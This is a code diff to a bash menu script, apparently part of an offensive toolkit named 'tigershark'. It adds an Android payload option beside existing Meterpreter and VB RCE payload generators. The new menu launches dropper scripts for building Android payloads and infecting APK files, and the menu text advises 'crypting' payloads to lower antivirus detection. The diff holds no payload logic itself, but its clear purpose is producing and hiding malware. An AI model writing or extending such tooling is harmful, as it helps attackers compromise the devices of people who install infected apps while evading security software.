@@ -175,7 +175,7 @@ dropper_mods(){
     echo -e "${LP}"
     echo -e "${RED}NOTE: ${LBBLUE}Crypting your payloads is encouraged${NC} \n${LBBLUE}for best results and low detection rates${NC}"
     PS3='How would you like to create your payload?'
-        options=("Meterpreter payloads" "VB RCE's" "Back") # "Macros"
+        options=("Meterpreter payloads" "VB RCE's" "Droid Payloads" "Back") # "Macros"
         select opt in "${options[@]}"
         do
             case $opt in
@@ -185,6 +185,10 @@ dropper_mods(){
 
                 "VB RCE's")
                     vbs
+                    ;;
+                
+                "Droid Payloads")
+                    droid
                     ;;
 
  #               "Macros")
@@ -197,6 +201,30 @@ dropper_mods(){
             esac
         done
     echo -e "${NC}"
+}
+# Android Payloads
+droid(){
+    echo -e "${RED}"
+        PS3='How would you like to compile your android payload?'
+            options=("GetDroid" "apkinfector" "Back")
+            select opt in "${options[@]}"
+            do
+                case $opt in
+                    "GetDroid")
+                        ./Modules/Droppers/droid/getdroid.sh
+                        ;;
+
+                    "apkinfector")
+                        ./Modules/Droppers/droid/apkinf.sh
+                        ;;
+
+                    "Back")
+                        ./tigershark
+                        ;;
+
+                esac
+            done
+        echo -e "${NC}"
 }
 # Obfuscation
 obs(){
